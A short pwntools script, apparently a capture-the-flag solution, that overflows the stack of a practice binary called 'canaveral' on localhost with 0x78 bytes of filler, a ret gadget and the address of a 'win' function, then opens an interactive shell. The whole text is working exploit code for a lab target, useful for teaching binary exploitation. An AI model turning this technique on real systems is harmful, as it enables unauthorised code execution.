from pwn import *

# Establish the target
HOST = "localhost"
PORT = 24602

elf = context.binary = ELF('../../.build/i95/i95-canaveral/canaveral')
rop = ROP(elf)

target = remote(HOST, PORT)

# Form the payload
# Filler to return address, ret gadget, then win function
ret_gadget = rop.ret[0]
win_func = elf.sym['win']

payload = b"0"*0x78 + p64(ret_gadget) + p64(win_func)

# Send the payload
target.sendlineafter(b'command: ', payload)

# Drop to an interactive shell
target.interactive()

